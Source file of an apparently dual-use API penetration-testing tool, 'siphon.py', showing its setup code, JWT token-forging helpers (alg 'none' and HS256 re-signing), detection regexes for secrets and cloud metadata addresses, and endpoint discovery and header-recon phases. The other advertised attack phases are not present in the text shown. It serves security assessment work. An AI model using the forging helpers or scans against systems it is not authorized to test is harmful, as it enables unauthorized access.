#!/usr/bin/env python3
"""
siphon.py — API Penetration Testing Orchestrator

Performs comprehensive API security assessment covering OWASP API
Security Top 10 2023: BOLA, Broken Auth, Mass Assignment, Rate Limiting,
BFLA, SSRF, Misconfiguration, Inventory Management, and JWT attacks.

Works on Linux, macOS, and Windows.
"""

import sys
import os
import subprocess
import importlib
import importlib.util
import platform
import re
import shutil
import argparse
import json
import csv
import socket
import threading
import signal
import getpass
import tempfile
import hashlib
import base64
import hmac
import struct
import time
import copy
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse, urljoin, urlencode, quote

VERSION = "1.0.1"

# ---------------------------------------------------------------------------
# Dependency bootstrap
# ---------------------------------------------------------------------------

_THIRD_PARTY_DEPS = [
    ("requests",  "requests",  "HTTP library for API probing"),
    ("colorama",  "colorama",  "ANSI color output"),
]
_REQUIRED_PKGS = {"requests", "colorama"}


def _is_importable(module_name: str) -> bool:
    return importlib.util.find_spec(module_name) is not None


def _pip_install(package: str) -> bool:
    try:
        result = subprocess.run(
            [sys.executable, "-m", "pip", "install", "--quiet", package],
            capture_output=True, text=True, timeout=120,
        )
        return result.returncode == 0
    except Exception:
        return False


def _ensure_dependencies() -> None:
    missing = [
        (mod, pkg, desc)
        for mod, pkg, desc in _THIRD_PARTY_DEPS
        if not _is_importable(mod)
    ]
    if not missing:
        return
    print("[siphon] Installing missing Python dependencies …")
    for mod, pkg, desc in missing:
        print(f"  pip install {pkg}  ({desc})")
        if not _pip_install(pkg):
            print(f"  [ERROR] Failed to install {pkg}. Run: pip install {pkg}")
            sys.exit(1)
    print("[siphon] Dependencies installed.\n")


_ensure_dependencies()

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

try:
    from colorama import init as _colorama_init, Fore, Style
    _colorama_init(autoreset=True)
    _HAS_COLOR = True
except ImportError:
    _HAS_COLOR = False
    class Fore:  # type: ignore
        RED = GREEN = YELLOW = CYAN = MAGENTA = BLUE = WHITE = ""
    class Style:  # type: ignore
        BRIGHT = DIM = RESET_ALL = ""

# ---------------------------------------------------------------------------
# VantageConsole — protocol bridge when managed by Vantage/Crucible
# ---------------------------------------------------------------------------

_MANAGED = os.environ.get("VANTAGE_MANAGED", "0") == "1"


class VantageConsole:
    """Emits structured protocol tokens when run under Vantage/Crucible."""

    # Protocol tokens
    LOG    = "__VANTAGE_LOG__:"
    ERR    = "__VANTAGE_ERR__:"
    STATUS = "__VANTAGE_STATUS__:"
    PROMPT = "__VANTAGE_PROMPT__:"

    # Severity → color mapping
    _SEV_COLOR = {
        "CRITICAL": Fore.RED + Style.BRIGHT,
        "HIGH":     Fore.RED,
        "MEDIUM":   Fore.YELLOW,
        "LOW":      Fore.CYAN,
        "INFO":     Fore.GREEN,
        "DEBUG":    Style.DIM,
    }

    def __init__(self, managed: bool = _MANAGED):
        self.managed = managed
        self._lock = threading.Lock()

    # ------------------------------------------------------------------ raw
    def _emit(self, token: str, text: str) -> None:
        with self._lock:
            sys.stdout.write(f"{token}{text}\n")
            sys.stdout.flush()

    # ------------------------------------------------------------------ public
    def log(self, msg: str, level: str = "INFO") -> None:
        color = self._SEV_COLOR.get(level, "")
        if self.managed:
            self._emit(self.LOG, f"[{level}] {msg}")
        else:
            print(f"{color}[{level}]{Style.RESET_ALL} {msg}")

    def err(self, msg: str) -> None:
        if self.managed:
            self._emit(self.ERR, msg)
        else:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {msg}", file=sys.stderr)

    def status(self, phase: str, state: str, detail: str = "") -> None:
        payload = json.dumps({"phase": phase, "state": state, "detail": detail})
        if self.managed:
            self._emit(self.STATUS, payload)
        else:
            icon = {"running": ">>", "done": "OK", "skip": "--", "fail": "!!"}.get(state, "::")
            color = {"running": Fore.CYAN, "done": Fore.GREEN,
                     "skip": Style.DIM, "fail": Fore.RED}.get(state, "")
            print(f"{color}[{icon}]{Style.RESET_ALL} {phase}: {detail}")

    def finding(self, title: str, severity: str, detail: str, evidence: str = "") -> None:
        color = self._SEV_COLOR.get(severity, "")
        if self.managed:
            payload = json.dumps({
                "type": "finding", "title": title,
                "severity": severity, "detail": detail, "evidence": evidence,
            })
            self._emit(self.LOG, payload)
        else:
            print(f"\n{color}[FINDING — {severity}]{Style.RESET_ALL} {title}")
            print(f"  Detail  : {detail}")
            if evidence:
                print(f"  Evidence: {evidence}")

    def prompt(self, question: str, default: str = "") -> str:
        if self.managed:
            self._emit(self.PROMPT, json.dumps({"question": question, "default": default}))
            answer = sys.stdin.readline().strip()
            return answer if answer else default
        else:
            suffix = f" [{default}]" if default else ""
            try:
                answer = input(f"{Fore.CYAN}{question}{suffix}: {Style.RESET_ALL}").strip()
            except (EOFError, KeyboardInterrupt):
                return default
            return answer if answer else default

    def prompt_secret(self, question: str) -> str:
        if self.managed:
            self._emit(self.PROMPT, json.dumps({"question": question, "secret": True}))
            return sys.stdin.readline().strip()
        else:
            try:
                return getpass.getpass(f"{Fore.CYAN}{question}: {Style.RESET_ALL}")
            except (EOFError, KeyboardInterrupt):
                return ""

    def banner(self, text: str) -> None:
        if self.managed:
            self._emit(self.LOG, text)
        else:
            print(f"{Fore.CYAN}{Style.BRIGHT}{text}{Style.RESET_ALL}")

    def section(self, title: str) -> None:
        bar = "─" * 60
        if self.managed:
            self._emit(self.LOG, f"\n{bar}\n  {title}\n{bar}")
        else:
            print(f"\n{Fore.BLUE}{Style.BRIGHT}{bar}\n  {title}\n{bar}{Style.RESET_ALL}")

    def info(self, msg: str) -> None:
        self.log(msg, "INFO")

    def warn(self, msg: str) -> None:
        self.log(msg, "MEDIUM")

    def debug(self, msg: str) -> None:
        if os.environ.get("SIPHON_DEBUG"):
            self.log(msg, "DEBUG")


# Global console instance
con = VantageConsole()


# ---------------------------------------------------------------------------
# ProgressManager — thread-safe progress dots / spinner
# ---------------------------------------------------------------------------

class ProgressManager:
    """Simple threaded spinner / progress indicator."""

    _SPINNER = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

    def __init__(self, console: VantageConsole):
        self.con = console
        self._thread: threading.Thread | None = None
        self._stop_evt = threading.Event()
        self._msg = ""
        self._lock = threading.Lock()

    def start(self, msg: str) -> None:
        if self.con.managed:
            self.con.log(f"{msg} …")
            return
        self._stop_evt.clear()
        self._msg = msg
        self._thread = threading.Thread(target=self._spin, daemon=True)
        self._thread.start()

    def update(self, msg: str) -> None:
        with self._lock:
            self._msg = msg

    def stop(self, final: str = "") -> None:
        if self.con.managed:
            if final:
                self.con.log(final)
            return
        self._stop_evt.set()
        if self._thread:
            self._thread.join(timeout=2)
        if final:
            sys.stdout.write(f"\r{' ' * 80}\r{Fore.GREEN}[OK]{Style.RESET_ALL} {final}\n")
        else:
            sys.stdout.write(f"\r{' ' * 80}\r")
        sys.stdout.flush()

    def _spin(self) -> None:
        idx = 0
        while not self._stop_evt.is_set():
            with self._lock:
                msg = self._msg
            frame = self._SPINNER[idx % len(self._SPINNER)]
            sys.stdout.write(f"\r{Fore.CYAN}{frame}{Style.RESET_ALL} {msg} …")
            sys.stdout.flush()
            idx += 1
            time.sleep(0.1)


# ---------------------------------------------------------------------------
# OutputManager — findings catalogue + report writer
# ---------------------------------------------------------------------------

class OutputManager:
    """Accumulates findings and writes JSON/CSV/text reports."""

    SEVERITIES = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]

    def __init__(self, project: str):
        self.project = project
        self.out_dir = Path(project)
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.findings: list[dict] = []
        self._lock = threading.Lock()
        self._start_time = datetime.utcnow()

    # ---------------------------------------------------------------- adding
    def add_finding(
        self,
        phase: str,
        title: str,
        severity: str,
        url: str,
        detail: str,
        evidence: str = "",
        remediation: str = "",
        extra: dict | None = None,
    ) -> dict:
        entry = {
            "id": len(self.findings) + 1,
            "phase": phase,
            "title": title,
            "severity": severity.upper(),
            "url": url,
            "detail": detail,
            "evidence": evidence,
            "remediation": remediation,
            "timestamp": datetime.utcnow().isoformat() + "Z",
        }
        if extra:
            entry.update(extra)
        with self._lock:
            self.findings.append(entry)
        return entry

    def count_by_severity(self) -> dict:
        counts = {s: 0 for s in self.SEVERITIES}
        for f in self.findings:
            sev = f.get("severity", "INFO")
            if sev in counts:
                counts[sev] += 1
        return counts

    # ---------------------------------------------------------------- saving
    def save_json(self, filename: str = "siphon_output.json") -> Path:
        path = self.out_dir / filename
        data = {
            "tool": "siphon",
            "version": VERSION,
            "generated": datetime.utcnow().isoformat() + "Z",
            "summary": self.count_by_severity(),
            "findings": self.findings,
        }
        path.write_text(json.dumps(data, indent=2))
        return path

    def save_csv(self, filename: str = "siphon_output.csv") -> Path:
        path = self.out_dir / filename
        fields = ["id", "phase", "title", "severity", "url", "detail",
                  "evidence", "remediation", "timestamp"]
        with path.open("w", newline="") as fh:
            writer = csv.DictWriter(fh, fieldnames=fields, extrasaction="ignore")
            writer.writeheader()
            writer.writerows(self.findings)
        return path

    def save_text(self, filename: str = "siphon_output.txt") -> Path:
        path = self.out_dir / filename
        lines = [
            f"Siphon API Penetration Testing Report",
            f"Generated : {datetime.utcnow().isoformat()}Z",
            f"Version   : {VERSION}",
            "=" * 60,
        ]
        counts = self.count_by_severity()
        lines.append("\nSummary:")
        for sev in self.SEVERITIES:
            lines.append(f"  {sev:<10}: {counts[sev]}")
        lines.append("\nFindings:")
        lines.append("-" * 60)
        for f in self.findings:
            lines += [
                f"\n[{f['id']}] {f['severity']} — {f['title']}",
                f"  Phase    : {f['phase']}",
                f"  URL      : {f['url']}",
                f"  Detail   : {f['detail']}",
            ]
            if f.get("evidence"):
                lines.append(f"  Evidence : {f['evidence']}")
            if f.get("remediation"):
                lines.append(f"  Fix      : {f['remediation']}")
        path.write_text("\n".join(lines))
        return path

    def save_inventory(self, inventory: list, filename: str = "api_inventory.json") -> Path:
        path = self.out_dir / filename
        path.write_text(json.dumps(inventory, indent=2))
        return path

    def save_all(self, inventory: list | None = None) -> None:
        self.save_json()
        self.save_csv()
        self.save_text()
        if inventory:
            self.save_inventory(inventory)

    def print_summary(self) -> None:
        counts = self.count_by_severity()
        elapsed = (datetime.utcnow() - self._start_time).total_seconds()
        con.section("Scan Complete")
        con.info(f"Duration : {elapsed:.1f}s")
        con.info(f"Findings : {len(self.findings)} total")
        for sev in self.SEVERITIES:
            if counts[sev]:
                con.log(f"  {sev:<10}: {counts[sev]}", sev)
        con.info(f"Output   : {self.out_dir}/")


# ---------------------------------------------------------------------------
# Signal handling
# ---------------------------------------------------------------------------

_shutdown_requested = False


def _install_signal_handlers() -> None:
    def _handler(sig, frame):
        global _shutdown_requested
        _shutdown_requested = True
        con.err("\n[siphon] Interrupted — saving partial results …")
    signal.signal(signal.SIGINT, _handler)
    if hasattr(signal, "SIGTERM"):
        signal.signal(signal.SIGTERM, _handler)


# ---------------------------------------------------------------------------
# HTTP session helpers
# ---------------------------------------------------------------------------

def _make_session(settings: dict) -> requests.Session:
    scan = settings.get("scan", {})
    sess = requests.Session()
    retry = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=[500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"],
    )
    adapter = HTTPAdapter(max_retries=retry)
    sess.mount("http://", adapter)
    sess.mount("https://", adapter)
    sess.verify = scan.get("verify_ssl", False)
    proxy = scan.get("proxy", "")
    if proxy:
        sess.proxies = {"http": proxy, "https": proxy}
    ua = scan.get("user_agent", f"Mozilla/5.0 (compatible; Siphon/{VERSION}; Security Assessment)")
    sess.headers.update({"User-Agent": ua})
    extra_hdrs = scan.get("extra_headers", {})
    if extra_hdrs:
        sess.headers.update(extra_hdrs)
    return sess


def _build_auth_session(settings: dict, auth_key: str = "auth") -> requests.Session | None:
    scan = settings.get("scan", {})
    auth_cfg = scan.get(auth_key, {})
    if not auth_cfg.get("enabled", False):
        return None
    sess = _make_session(settings)
    auth_type = auth_cfg.get("auth_type", "token").lower()
    token = auth_cfg.get("auth_token", "").strip()
    cookie = auth_cfg.get("session_cookie", "").strip()

    if token:
        token_type = auth_cfg.get("token_type", "Bearer")
        sess.headers["Authorization"] = f"{token_type} {token}"
    elif cookie:
        for part in cookie.split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                sess.cookies.set(k.strip(), v.strip())
    elif auth_type == "form":
        login_url = auth_cfg.get("login_url", "")
        login_data_raw = auth_cfg.get("login_data", "{}")
        try:
            login_data = json.loads(login_data_raw) if isinstance(login_data_raw, str) else login_data_raw
        except json.JSONDecodeError:
            login_data = {}
        if login_url:
            try:
                resp = sess.post(login_url, json=login_data, timeout=scan.get("timeout", 10))
                # Try to extract token from response
                try:
                    body = resp.json()
                    for key in ("token", "access_token", "jwt", "id_token", "auth_token"):
                        if key in body:
                            sess.headers["Authorization"] = f"Bearer {body[key]}"
                            break
                except Exception:
                    pass
            except Exception as exc:
                con.err(f"Auth login failed: {exc}")
    elif auth_type == "basic":
        username = auth_cfg.get("username", "")
        password = auth_cfg.get("password", "")
        if username:
            sess.auth = (username, password)
    return sess


def _parse_target(target: str) -> dict:
    """Parse and normalize an API base URL."""
    target = target.strip()
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    parsed = urlparse(target)
    return {
        "url":      target.rstrip("/"),
        "scheme":   parsed.scheme,
        "host":     parsed.hostname or "",
        "port":     parsed.port or (443 if parsed.scheme == "https" else 80),
        "path":     parsed.path.rstrip("/"),
        "netloc":   parsed.netloc,
    }


# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------

BANNER = r"""
  ███████╗██╗██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗
  ██╔════╝██║██╔══██╗██║  ██║██╔═══██╗████╗  ██║
  ███████╗██║██████╔╝███████║██║   ██║██╔██╗ ██║
  ╚════██║██║██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║
  ███████║██║██║     ██║  ██║╚██████╔╝██║ ╚████║
  ╚══════╝╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
"""

# ---------------------------------------------------------------------------
# DEFAULT_SETTINGS
# ---------------------------------------------------------------------------

DEFAULT_SETTINGS: dict = {
    "engagement": {
        "consultant":       "",
        "client_name":      "",
        "client_short":     "",
        "consultant_email": "",
        "start_date":       "",
        "end_date":         "",
    },
    "scan": {
        "project":        "siphon_output",
        "api_base_url":   "",
        "api_base_urls":  [],
        "openapi_url":    "",
        "threads":        20,
        "timeout":        10,
        "user_agent":     "Mozilla/5.0 (compatible; Siphon/1.0; Security Assessment)",
        "extra_headers":  {},
        "proxy":          "",
        "verify_ssl":     False,
        "phases": {
            "discovery":        True,
            "recon":            True,
            "fuzzing":          True,
            "injection":        True,
            "auth_bypass":      True,
            "rate_limiting":    True,
            "mass_assignment":  True,
            "ssrf":             True,
            "data_exposure":    True,
            "graphql":          False,
            "bola":             False,
            "bfla":             False,
            "cross_user":       False,
            "session":          False,
            "jwt":              False,
        },
        "auth": {
            "enabled":        False,
            "username":       "",
            "password":       "",
            "auth_type":      "token",
            "login_url":      "",
            "login_data":     "",
            "auth_token":     "",
            "token_type":     "Bearer",
            "session_cookie": "",
        },
        "auth2": {
            "enabled":        False,
            "username":       "",
            "password":       "",
            "auth_token":     "",
            "session_cookie": "",
        },
        "jwt_secret":              "",
        "rate_limit_threshold":    50,
        "mass_assignment_fields":  [],
    },
}

# ---------------------------------------------------------------------------
# PHASE_LIST
# ---------------------------------------------------------------------------

PHASE_LIST = [
    ("discovery",       "Phase 0:  OpenAPI/Swagger discovery, endpoint inventory"),
    ("recon",           "Phase 1:  API fingerprinting, server headers, version info"),
    ("fuzzing",         "Phase 2:  HTTP method fuzzing, parameter fuzzing"),
    ("injection",       "Phase 3:  SQLi, NoSQLi, SSTI, XXE, LDAP injection via API"),
    ("auth_bypass",     "Phase 4:  JWT algorithm confusion, none-alg, key confusion"),
    ("rate_limiting",   "Phase 5:  Rate limit detection and bypass techniques"),
    ("mass_assignment", "Phase 6:  Mass assignment / over-posting attack testing"),
    ("ssrf",            "Phase 7:  SSRF via API URL parameters"),
    ("data_exposure",   "Phase 8:  Excessive data exposure in API responses"),
    ("graphql",         "Phase 9:  GraphQL introspection and query fuzzing"),
    ("bola",            "Phase 10: BOLA/IDOR — cross-user object access (auth required)"),
    ("bfla",            "Phase 11: BFLA — function-level authorization bypass (auth required)"),
    ("cross_user",      "Phase 12: Cross-user data leakage (auth + auth2 required)"),
    ("session",         "Phase 13: API session / token management analysis (auth required)"),
    ("jwt",             "Phase 14: JWT advanced attacks — jku, kid, HMAC cracking (auth required)"),
]

# ---------------------------------------------------------------------------
# Settings loader
# ---------------------------------------------------------------------------

def _deep_merge(base: dict, override: dict) -> dict:
    result = copy.deepcopy(base)
    for k, v in override.items():
        if k in result and isinstance(result[k], dict) and isinstance(v, dict):
            result[k] = _deep_merge(result[k], v)
        else:
            result[k] = v
    return result


def _load_settings(path: str | None) -> dict:
    if not path:
        return copy.deepcopy(DEFAULT_SETTINGS)
    p = Path(path)
    if not p.exists():
        con.err(f"Settings file not found: {path}")
        sys.exit(1)
    try:
        data = json.loads(p.read_text())
        return _deep_merge(DEFAULT_SETTINGS, data)
    except json.JSONDecodeError as exc:
        con.err(f"Invalid JSON in settings file: {exc}")
        sys.exit(1)


# ---------------------------------------------------------------------------
# Argument parser
# ---------------------------------------------------------------------------

def _parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(
        prog="siphon",
        description="Siphon — API Penetration Testing Orchestrator v" + VERSION,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="\n".join(f"  {n:<16} {d}" for n, d in PHASE_LIST),
    )
    ap.add_argument("--settings",     metavar="FILE",  help="JSON settings file")
    ap.add_argument("--url",          metavar="URL",   help="API base URL")
    ap.add_argument("--openapi",      metavar="URL",   help="OpenAPI/Swagger spec URL or file path")
    ap.add_argument("--project",      metavar="DIR",   help="Output directory")
    ap.add_argument("--fast",         action="store_true", help="Skip slow phases")
    ap.add_argument("--resume",       metavar="DIR",   help="Resume from existing output directory")
    ap.add_argument("--no-injection", action="store_true", help="Skip injection phase")
    ap.add_argument("--no-auth",      action="store_true", help="Skip auth-required phases")
    ap.add_argument("--list-phases",  action="store_true", help="List all phases and exit")
    ap.add_argument("--username",     metavar="USER",  help="Auth username")
    ap.add_argument("--password",     metavar="PASS",  help="Auth password")
    ap.add_argument("--auth-type",    metavar="TYPE",  choices=["token", "basic", "form"])
    ap.add_argument("--login-url",    metavar="URL",   help="Login endpoint URL")
    ap.add_argument("--auth-token",   metavar="TOKEN", help="Pre-obtained auth token")
    ap.add_argument("--threads",      type=int,        metavar="N")
    ap.add_argument("--timeout",      type=int,        metavar="SEC")
    ap.add_argument("--proxy",        metavar="URL",   help="HTTP proxy")
    ap.add_argument("--version",      action="version", version=f"siphon {VERSION}")
    return ap.parse_args()


def _apply_args(settings: dict, args: argparse.Namespace) -> dict:
    scan = settings["scan"]
    if args.url:
        scan["api_base_url"] = args.url.rstrip("/")
    if args.openapi:
        scan["openapi_url"] = args.openapi
    if args.project:
        scan["project"] = args.project
    if args.threads:
        scan["threads"] = args.threads
    if args.timeout:
        scan["timeout"] = args.timeout
    if args.proxy:
        scan["proxy"] = args.proxy
    if args.fast:
        scan["phases"]["injection"] = False
        scan["phases"]["jwt"] = False
    if args.no_injection:
        scan["phases"]["injection"] = False
    if args.no_auth:
        for phase in ("bola", "bfla", "cross_user", "session", "jwt", "auth_bypass"):
            scan["phases"][phase] = False
    if args.auth_token:
        scan["auth"]["enabled"] = True
        scan["auth"]["auth_token"] = args.auth_token
    if args.username:
        scan["auth"]["enabled"] = True
        scan["auth"]["username"] = args.username
    if args.password:
        scan["auth"]["password"] = args.password
    if args.auth_type:
        scan["auth"]["auth_type"] = args.auth_type
    if args.login_url:
        scan["auth"]["login_url"] = args.login_url
    return settings


# ---------------------------------------------------------------------------
# JWT utilities
# ---------------------------------------------------------------------------

def _b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.b64decode(s)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _jwt_decode_token(token: str):
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _jwt_none_alg(token: str) -> str | None:
    decoded = _jwt_decode_token(token)
    if not decoded:
        return None
    header, payload, _ = decoded
    header["alg"] = "none"
    new_header  = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{new_header}.{new_payload}."


def _jwt_forge_hs256(token: str, secret: str) -> str | None:
    decoded = _jwt_decode_token(token)
    if not decoded:
        return None
    header, payload, _ = decoded
    header["alg"] = "HS256"
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    msg = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


# ---------------------------------------------------------------------------
# Response analysis helpers
# ---------------------------------------------------------------------------

_SENSITIVE_RE = re.compile(
    r'\b(password|passwd|secret|token|api_key|apikey|ssn|social_security|'
    r'credit_card|cc_number|card_number|cvv|private_key|private|'
    r'access_token|refresh_token|client_secret|aws_secret|'
    r'auth_token|session_token|bearer)\b',
    re.IGNORECASE
)

_SQL_ERR_RE = re.compile(
    r'(sql syntax|mysql_fetch|ORA-\d+|syntax error|pg_query|sqlite3|'
    r'SQLSTATE|Unclosed quotation|Microsoft OLE DB|ODBC SQL Server|invalid query)',
    re.IGNORECASE
)

_NOSQL_ERR_RE = re.compile(
    r'(MongoError|BSONTypeError|CastError|mongodb|mongoose)',
    re.IGNORECASE
)

_SSRF_INTERNAL_RE = re.compile(
    r'(169\.254\.169\.254|instance-data|computeMetadata|'
    r'ami-id|instance-id|meta-data|localhost)',
    re.IGNORECASE
)


def _extract_json_keys(obj, prefix="") -> list:
    keys = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            full_key = f"{prefix}.{k}" if prefix else k
            keys.append(full_key)
            keys.extend(_extract_json_keys(v, full_key))
    elif isinstance(obj, list):
        for item in obj:
            keys.extend(_extract_json_keys(item, prefix))
    return keys


def _safe_get(sess: requests.Session, url: str, timeout: int = 10, **kwargs):
    try:
        return sess.get(url, timeout=timeout, **kwargs)
    except Exception:
        return None


def _safe_request(sess: requests.Session, method: str, url: str, timeout: int = 10, **kwargs):
    try:
        return sess.request(method, url, timeout=timeout, **kwargs)
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Phase 0: Discovery — OpenAPI/Swagger spec parsing + endpoint inventory
# ---------------------------------------------------------------------------

_DISCOVERY_PATHS = [
    "/swagger.json",
    "/openapi.json",
    "/openapi.yaml",
    "/api/docs",
    "/api-docs",
    "/swagger/v1/swagger.json",
    "/swagger/v2/swagger.json",
    "/v2/api-docs",
    "/v3/api-docs",
    "/api/swagger.json",
    "/api/openapi.json",
    "/api/v1/swagger.json",
    "/api/v2/swagger.json",
    "/api/v3/swagger.json",
    "/docs/swagger.json",
    "/swagger-ui/swagger.json",
    "/.well-known/openapi.json",
    "/api/spec.json",
    "/api/schema",
    "/schema.json",
]


def _parse_openapi_spec(spec: dict) -> list:
    """Parse OpenAPI 2.x or 3.x spec and return list of endpoint dicts."""
    inventory = []
    paths = spec.get("paths", {})
    # Determine base path
    base = ""
    if "basePath" in spec:
        base = spec["basePath"].rstrip("/")
    servers = spec.get("servers", [])
    if servers and isinstance(servers, list):
        server_url = servers[0].get("url", "")
        # Use path component only if full URL
        parsed = urlparse(server_url)
        if parsed.path and parsed.path != "/":
            base = parsed.path.rstrip("/")

    for path, methods in paths.items():
        if not isinstance(methods, dict):
            continue
        for method, op in methods.items():
            if method.lower() in ("get", "post", "put", "delete", "patch",
                                   "head", "options", "trace"):
                if not isinstance(op, dict):
                    continue
                params = []
                for p in op.get("parameters", []):
                    if isinstance(p, dict):
                        params.append({
                            "name": p.get("name", ""),
                            "in":   p.get("in", "query"),
                            "required": p.get("required", False),
                        })
                # Extract request body fields (OAS3)
                body_fields = []
                req_body = op.get("requestBody", {})
                if req_body:
                    content = req_body.get("content", {})
                    for ct, ct_info in content.items():
                        schema = ct_info.get("schema", {})
                        props = schema.get("properties", {})
                        body_fields.extend(list(props.keys()))

                auth_required = bool(op.get("security", spec.get("security", [])))
                inventory.append({
                    "method":         method.upper(),
                    "path":           base + path,
                    "params":         params,
                    "body_fields":    body_fields,
                    "auth_required":  auth_required,
                    "operation_id":   op.get("operationId", ""),
                    "tags":           op.get("tags", []),
                    "summary":        op.get("summary", ""),
                })
    return inventory


def _fetch_spec(url_or_path: str, sess: requests.Session, timeout: int) -> dict | None:
    """Fetch and parse an OpenAPI spec from URL or file path."""
    # File path
    if not url_or_path.startswith("http"):
        p = Path(url_or_path)
        if p.exists():
            content = p.read_text()
        else:
            con.err(f"Spec file not found: {url_or_path}")
            return None
    else:
        resp = _safe_get(sess, url_or_path, timeout=timeout)
        if not resp or resp.status_code != 200:
            return None
        content = resp.text

    # Try JSON first
    try:
        return json.loads(content)
    except json.JSONDecodeError:
        pass
    # Try YAML
    try:
        import yaml
        return yaml.safe_load(content)
    except Exception:
        pass
    return None


def phase_discovery(settings: dict, sess: requests.Session,
                    output: OutputManager) -> list:
    """Phase 0: Discover API endpoints via OpenAPI spec or probing."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    openapi_url = scan.get("openapi_url", "")
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    inventory: list = []

    con.status("discovery", "running", "Scanning for API specification")

    # 1. If explicit spec URL/path given, use it
    spec_url = openapi_url
    spec = None

    if spec_url:
        spec = _fetch_spec(spec_url, sess, timeout)
        if spec:
            con.info(f"Loaded spec from: {spec_url}")
            output.add_finding(
                phase="discovery",
                title="API Specification Exposed",
                severity="INFO",
                url=spec_url,
                detail="OpenAPI/Swagger specification is publicly accessible.",
                evidence=f"URL: {spec_url}",
                remediation="Restrict spec access to authorized users in production.",
            )

    # 2. Auto-probe common paths if no spec yet
    if not spec:
        root = f"{target['scheme']}://{target['netloc']}"
        for probe_path in _DISCOVERY_PATHS:
            probe_url = root + probe_path
            resp = _safe_get(sess, probe_url, timeout=timeout)
            if resp and resp.status_code == 200:
                content_type = resp.headers.get("Content-Type", "")
                if any(ct in content_type for ct in ("json", "yaml", "text")):
                    spec = _fetch_spec(probe_url, sess, timeout)
                    if spec and ("paths" in spec or "swagger" in spec or "openapi" in spec):
                        con.info(f"Discovered spec at: {probe_url}")
                        output.add_finding(
                            phase="discovery",
                            title="API Specification Exposed",
                            severity="LOW",
                            url=probe_url,
                            detail=f"OpenAPI/Swagger spec found at {probe_url}",
                            evidence=f"HTTP 200 with spec content",
                            remediation="Restrict specification access in production environments.",
                        )
                        break

    # 3. Parse spec into inventory
    if spec:
        inventory = _parse_openapi_spec(spec)
        con.info(f"Discovered {len(inventory)} API endpoints from spec")
    else:
        con.info("No spec found; building minimal inventory from base URL")
        inventory = [{
            "method": "GET",
            "path": target["path"] or "/",
            "params": [],
            "body_fields": [],
            "auth_required": False,
            "operation_id": "root",
            "tags": [],
            "summary": "Base API endpoint",
        }]

    # 4. Save inventory
    output.save_inventory(inventory)
    con.status("discovery", "done", f"{len(inventory)} endpoints in inventory")
    return inventory


# ---------------------------------------------------------------------------
# Phase 1: Recon — fingerprinting, headers, CORS
# ---------------------------------------------------------------------------

def phase_recon(settings: dict, sess: requests.Session,
                output: OutputManager) -> None:
    """Phase 1: API fingerprinting and security header analysis."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)

    con.status("recon", "running", "Fingerprinting API server")

    resp = _safe_get(sess, base_url, timeout=timeout)
    if not resp:
        # Try HEAD
        resp = _safe_request(sess, "HEAD", base_url, timeout=timeout)
    if not resp:
        con.warn("Recon: could not reach API base URL")
        con.status("recon", "fail", "Unreachable")
        return

    # Server header disclosure
    server = resp.headers.get("Server", "")
    x_powered = resp.headers.get("X-Powered-By", "")
    x_generator = resp.headers.get("X-Generator", "")
    if server:
        output.add_finding(
            phase="recon",
            title="Server Header Discloses Technology",
            severity="LOW",
            url=base_url,
            detail=f"Server header reveals: {server}",
            evidence=f"Server: {server}",
            remediation="Remove or genericize the Server header.",
        )
    if x_powered:
        output.add_finding(
            phase="recon",
            title="X-Powered-By Header Discloses Framework",
            severity="LOW",
            url=base_url,
            detail=f"X-Powered-By header reveals: {x_powered}",
            evidence=f"X-Powered-By: {x_powered}",
            remediation="Remove X-Powered-By header from all responses.",
        )

    # Security headers
    missing_headers = []
    hdrs = resp.headers
    if not hdrs.get("X-Frame-Options") and not hdrs.get("Content-Security-Policy"):
        missing_headers.append("X-Frame-Options / CSP")
    if not hdrs.get("Strict-Transport-Security"):
        missing_headers.append("Strict-Transport-Security (HSTS)")
    if not hdrs.get("X-Content-Type-Options"):
        missing_headers.append("X-Content-Type-Options")
    if not hdrs.get("X-XSS-Protection") and not hdrs.get("Content-Security-Policy"):
        missing_headers.append("X-XSS-Protection / CSP")

    if missing_headers:
        output.add_finding(
            phase="recon",
            title="Missing Security Headers",
            severity="MEDIUM",
            url=base_url,
            detail=f"API is missing security headers: {', '.join(missing_headers)}",
            evidence="; ".join(f"{h}: (absent)" for h in missing_headers),
            remediation="Add missing security headers to API responses.",
        )

